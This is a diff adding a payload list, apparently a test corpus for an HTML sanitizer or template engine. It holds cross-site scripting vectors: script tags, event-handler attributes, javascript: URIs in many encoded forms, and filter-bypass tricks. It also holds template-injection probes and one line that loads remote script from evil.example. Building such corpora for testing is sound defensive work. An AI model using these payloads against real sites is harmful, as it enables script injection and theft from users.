@@ -1,0 +1,93 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+</style><script>alert(1)</script>
+</noscript><img src=x onerror=alert(1)>
+</iframe><script>alert(1)</script>
+</div><script>alert(1)</script>
+</p><script>alert(1)</script>
+<svg><script>alert(1)</script></svg>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
+<img src=x onerror=alert(1)>
+<img src=x:x onerror=alert(1)//>
+<img/src/onerror=alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<iframe src=javascript:alert(1)>
+<iframe srcdoc="<script>alert(1)</script>">
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<a href=javascript:alert(1)>x</a>
+<link rel=stylesheet href=javascript:alert(1)>
+<meta http-equiv=refresh content="0;url=javascript:alert(1)">
+<base href=javascript:alert(1)//>
+<form><button formaction=javascript:alert(1)>x
+<marquee onstart=alert(1)>
+<style>@import 'javascript:alert(1)';</style>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<SCRIPT SRC=//evil.example/x.js></SCRIPT>
+<ScRiPt>alert(1)</sCrIpT>
+"onmouseover="alert(1)
+' onmouseover='alert(1)
+" autofocus onfocus="alert(1)
+` onmouseover=alert(1) `
+javascript:alert(1)
+ javascript:alert(1)
+JaVaScRiPt:alert(1)
+JAVASCRIPT:alert(1)
+java\tscript:alert(1)
+java\nscript:alert(1)
+\tjavascript:alert(1)
+\njavascript:alert(1)
+\u0001javascript:alert(1)
+\u0000javascript:alert(1)
+java\u0000script:alert(1)
+javascript&#58;alert(1)
+javascript&colon;alert(1)
+&#106;avascript:alert(1)
+&#x6A;avascript:alert(1)
+&#0000106avascript:alert(1)
+%6Aavascript:alert(1)
+ javascript:alert(1)
+vbscript:msgbox(1)
+VBScript:msgbox(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:image/svg+xml,<svg onload=alert(1)>
+blob:https://evil.example/uuid
+filesystem:https://evil.example/x
+&#x27;);alert(1)//
+');alert(1)//
+");alert(1)//
+ alert(1)
+ alert(1)
+-->
+<!--
+<!--<script>alert(1)</script>-->
+]]><script>alert(1)</script>
+<![CDATA[<script>alert(1)</script>]]>
+%3Cscript%3Ealert(1)%3C/script%3E
+%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+<script>alert(1)</script>
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+{{7*7}}
+${7*7}
+${"x".repeat(3)}
+@if(true){X}@endif
+@raw<b>x</b>@endraw
+@for(var i : java.util.List.of(1)){X}@endfor
+@template.Other()
+$unsafe{"x"}
+$unsafe{"<b>x</b>"}
+!{var x = 1;}
+@`<b>x</b>`
+<%= 7*7 %>
+{% raw %}<b>x</b>{% endraw %}
+x-data="{ open: true }" @click="alert(1)"
